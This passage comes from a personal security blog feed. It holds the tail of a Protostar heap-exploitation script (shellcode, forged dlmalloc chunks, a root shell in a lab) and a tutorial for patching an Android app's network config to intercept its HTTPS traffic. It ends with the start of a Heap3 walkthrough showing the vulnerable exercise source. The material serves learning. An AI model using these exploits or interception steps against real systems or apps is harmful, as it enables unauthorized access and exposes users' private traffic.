</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31</span><span class="s">&#39;</span> \
</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\xc0\x40\xcd\x80</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># These eight bytes will be overwritten by unlink().</span>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="c"># Set the last byte to a &#39;/&#39; for memmove().</span>
</span><span class='line'><span class="n">ba</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;/&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDROOT/&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'><span class="c"># Use integer overflow to make dlmalloc think third chunk is four bytes before second chunk.</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">))</span>
</span><span class='line'><span class="c"># Add forward and backward pointers</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804e010</span><span class="p">))</span>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">final2</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
</span><span class='line'>
</span><span class='line'><span class="n">Process</span> <span class="n">OK</span>
</span><span class='line'><span class="n">whoami</span>
</span><span class='line'><span class="n">root</span>
</span></code></pre></td></tr></table></div></figure>


<h3>References</h3>

<ul>
<li><a href="https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387">https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
    <link href="https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api/"/>
    <updated>2020-10-16T17:08:35-04:00</updated>
    <id>https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api</id>
    <content type="html"><![CDATA[<p>Have you ever wanted to analyze the traffic between a mobile app and its servers or reverse engineer
a mobile app&rsquo;s non-public API? Here&rsquo;s one way.</p>

<p>The basic principle is to proxy the traffic from the app through a computer you control on which you
can capture and analyze traffic. If the app you&rsquo;re interested in is using an unencrypted protocol
like HTTP, this is pretty easy. Just run a proxy on your computer and configure your mobile device
to proxy network traffic through your computer&rsquo;s IP.</p>

<!-- more -->


<p>Most apps these days, however, use encrypted protocols like HTTPS (or are even required to by
default by mobile OSes). Data at the TCP layer and below like IP addresses and port numbers are
visible in plaintext, but all application level data at the HTTPS layer is encrypted. So you run a
proxy that supports HTTPS on your computer, but then your app doesn&rsquo;t trust the self-signed TLS
certificate your computer presents. Mobile apps used to trust certificates that the mobile device&rsquo;s
system trusted. So you could just download the self-signed certificate onto the mobile device and
configure the mobile OS to trust it. But these days mobile app frameworks let developers customize
their app&rsquo;s network security settings (<a href="https://developer.android.com/training/articles/security-config.html">like so for Android</a>).</p>

<p>Let&rsquo;s say your mobile app has custom trust anchors or pins certificates. What do you do now? You can
either</p>

<ol>
<li>disable the certificate check completely</li>
<li>or alter the certificate check</li>
</ol>


<p>I&rsquo;m not familiar with how to do this on iOS (there seem to be good resources out there <a href="https://www.guardsquare.com/en/blog/iOS-SSL-certificate-pinning-bypassing">like
this</a>) so will show how to do option two on Android.</p>

<h2>Setup mobile device and app</h2>

<p>I don&rsquo;t have an Android so used an emulator called <a href="https://www.genymotion.com/">Genymotion</a>. I created a Samsung Galaxy S9
virtual device which is has a recent enough Android OS to run most mobile apps. In order to install
the mobile app from the Google Play Store I had to install <a href="https://docs.genymotion.com/paas/7.0/07_Installing_OpenGApps.html#from-the-open-gapps-website">OpenGApps</a>. I think I&rsquo;m also able to
download the APK from the web and drag and drop it into the emulator to install.</p>

<!-- installed Hinge APK from here by drag and drop into emulator window
https://hinge-app.en.uptodown.com/android/download -->


<h2>Install Charles Proxy TLS certificate on device</h2>

<p>To install the <a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">Charles cert</a>, I had to open <a href="http://www.charlesproxy.com/getssl/">this page</a> in Chrome. The built-in browser in the
emulator didn&rsquo;t seem to prompt me to download the Charles cert, but Chrome did. I installed Chrome
by install OpenGApps and then installing Chrome from the Play store. I think I also needed to
configure the Android device to use Charles as its proxy with <a href="https://stackoverflow.com/a/32865855">these steps</a> in order to get the
certificate download prompt. Then I made the Android device trust it.</p>

<h2>Patch the Android app&rsquo;s network security config</h2>

<p>I used `apktool to decompile the APK.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brew install apktool
</span><span class='line'>
</span><span class='line'>apktool d /path/to/app.apk
</span><span class='line'>cd app
</span><span class='line'>find . -name network_security_config.xml
</span><span class='line'>./res/xml/network_security_config.xml
</span><span class='line'>
</span><span class='line'>cat res/xml/network_security_config.xml
</span><span class='line'>
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;network-security-config&gt;
</span><span class='line'>    &lt;domain-config cleartextTrafficPermitted="true"&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>    &lt;/domain-config&gt;
</span><span class='line'>&lt;/network-security-config&gt;</span></code></pre></td></tr></table></div></figure>


<p>The app only allows cleartext to the above two domains. I don&rsquo;t see any pinned certificates, but
there must be some defaults since the app didn&rsquo;t trust the same certs trusted by the Android OS. So
I updated <code>network_security_config.xml</code> to be the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;network-security-config&gt;
</span><span class='line'>    &lt;domain-config cleartextTrafficPermitted="true"&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>    &lt;/domain-config&gt;
</span><span class='line'>    &lt;base-config&gt;
</span><span class='line'>        &lt;trust-anchors&gt;
</span><span class='line'>            &lt;certificates src="system" /&gt;
</span><span class='line'>            &lt;certificates src="user" /&gt;
</span><span class='line'>        &lt;/trust-anchors&gt;
</span><span class='line'>    &lt;/base-config&gt;
</span><span class='line'>&lt;/network-security-config&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then I tried recompiling the patched APK but got the following error.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd app
</span><span class='line'>apktool b . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.1
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali folder into classes.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes10 folder into classes10.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes9 folder into classes9.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes7 folder into classes7.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes6 folder into classes6.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes8 folder into classes8.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes3 folder into classes3.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes4 folder into classes4.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes5 folder into classes5.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes2 folder into classes2.dex...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building resources...
</span><span class='line'>W: invalid resource directory name: /Users/dxia/Downloads/app/./res navigation
</span><span class='line'>brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_15064276297777137207.tmp, p, --forced-package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-version-vectors, -F, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL339327577576851750.tmp, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL5191817693537904820.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, -S, /Users/dxia/Downloads/app/./res, -M, /Users/dxia/Downloads/app/./AndroidManifest.xml]</span></code></pre></td></tr></table></div></figure>


<p>This <a href="https://github.com/iBotPeaches/Apktool/issues/1978#issuecomment-452894225">Github issue comment</a> suggested I run that command with the <code>--use-aapt2</code> switch.
Then I got another error.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apktool b --use-aapt2 . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.1
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building resources...
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2119: error: resource 'drawable/$avd_hide_password__0' has invalid entry name '$avd_hide_password__0'. Invalid character '$avd_hide_password__0'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2120: error: resource 'drawable/$avd_hide_password__1' has invalid entry name '$avd_hide_password__1'. Invalid character '$avd_hide_password__1'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2121: error: resource 'drawable/$avd_hide_password__2' has invalid entry name '$avd_hide_password__2'. Invalid character '$avd_hide_password__2'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2122: error: resource 'drawable/$avd_show_password__0' has invalid entry name '$avd_show_password__0'. Invalid character '$avd_show_password__0'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2123: error: resource 'drawable/$avd_show_password__1' has invalid entry name '$avd_show_password__1'. Invalid character '$avd_show_password__1'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2124: error: resource 'drawable/$avd_show_password__2' has invalid entry name '$avd_show_password__2'. Invalid character '$avd_show_password__2'.
</span><span class='line'>W: error: resource android:style/Animation.InputMethodFancy is private.
</span><span class='line'>W: error: resource android:style/Animation.VoiceInteractionSession is private.
</span><span class='line'>W: error: resource android:style/AlertDialog is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:10: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:40: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:70: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:99: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:8: error: style attribute 'android:attr/allowMassStorage' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:13: error: resource android:attr/internalMaxWidth is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:16: error: resource android:attr/internalMaxWidth is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:20: error: style attribute 'android:attr/internalMinHeight' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:17: error: resource android:attr/allowMassStorage is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:20: error: resource android:attr/allowMassStorage is private.
</span><span class='line'>W: error: resource android:style/DialogWindowTitle is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:13: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:14: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:20: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:21: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:24: error: resource android:attr/private_resource_pad31 not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:10: error: style attribute 'android:attr/internalMinHeight' is private.
</span><span class='line'>brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_11817644492691338390.tmp, link, -o, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6551307854758959712.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6723837428467013762.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, --manifest, /Users/dxia/Downloads/app-patched/./AndroidManifest.xml, /Users/dxia/Downloads/app-patched/./build/resources.zip]</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/iBotPeaches/Apktool/issues/2386#issuecomment-669505659">This PR</a> fixes the above on Linux and Windows. As of this writing, it&rsquo;s not released
yet. So I had to <a href="https://ibotpeaches.github.io/Apktool/build/">build from source</a> on an Ubuntu VM.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>java -jar ~/Apktool/brut.apktool/apktool-cli/build/libs/apktool-cli-all.jar b --use-aapt2 . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.2-3ac7e8-SNAPSHOT
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building apk file...
</span><span class='line'>I: Copying unknown files/dir...
</span><span class='line'>I: Built apk...</span></code></pre></td></tr></table></div></figure>


<p>I signed the patched APK. First I generated some keys. I&rsquo;m not sure if certain signing and key
algorithms are required, but these are the ones I used.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keytool -genkey -alias keys -keystore keys -sigalg MD5withRSA -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>
</span><span class='line'>Enter keystore password:
</span><span class='line'>Re-enter new password:
</span><span class='line'>What is your first and last name?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the name of your organizational unit?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the name of your organization?
</span><span class='line'>  [Unknown]:
</span><span class='line'>
</span><span class='line'>What is the name of your City or Locality?
</span><span class='line'>  [Unknown]:  What is the name of your State or Province?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the two-letter country code for this unit?
</span><span class='line'>  [Unknown]:
</span><span class='line'>Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
</span><span class='line'>  [no]:  yes
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Warning:
</span><span class='line'>The generated certificate uses the MD5withRSA signature algorithm which is considered a security risk.
</span><span class='line'>
</span><span class='line'>jarsigner -sigalg MD5withRSA -digestalg SHA1 -verbose -keystore keys app-patched.apk keys</span></code></pre></td></tr></table></div></figure>


<p>Then when dragging and dropping the patched APK into the virtual device, I got an error saying the
app couldn&rsquo;t be installed. In these cases, generating the logs and grepping through them for errors
like <code>INSTALL_PARSE_FAILED_NO_CERTIFICATES</code> and <code>INSTALL_FAILED_VERIFICATION_FAILURE</code> helps. I fixed
this last error by <a href="https://stackoverflow.com/questions/15014519/apk-installation-failed-install-failed-verification-failure">disabling USB verification</a> in the virtual device
settings. The setting for this is inside the virtual Android device itself under &ldquo;developer
settings.&rdquo;</p>

<h2>Sniff the traffic</h2>

<p>I made sure the traffic was proxied through my computer, the patched app started successfully, and I
was able to see unencrypted data in Charles!</p>

<p><img class="center" src="https://i.imgur.com/e8p2Ne3h.jpg"></p>

<h2>References</h2>

<ul>
<li>&ldquo;<a href="https://gist.github.com/unoexperto/80694ccaed6dadc304ad5b8196cbbd2c">How to patch Android app to sniff its HTTPS traffic with self-signed certificate</a>&rdquo;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
    <updated>2020-04-19T18:51:48-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
time to truly understand each one before moving onto the next as the exercises build on each
other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
level</a>, a relatively complex level that requires manipulating the heap to redirect code
execution to an arbitrary function. After rewatching the video many times and reading numerous other
online explanations, I finally understand! That moment of understanding feels so gratifying.</p>

<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
reinforce my understanding and to celebrate.</p>

<!-- more -->


<h2>Exploit Exercise Protostar Heap3</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
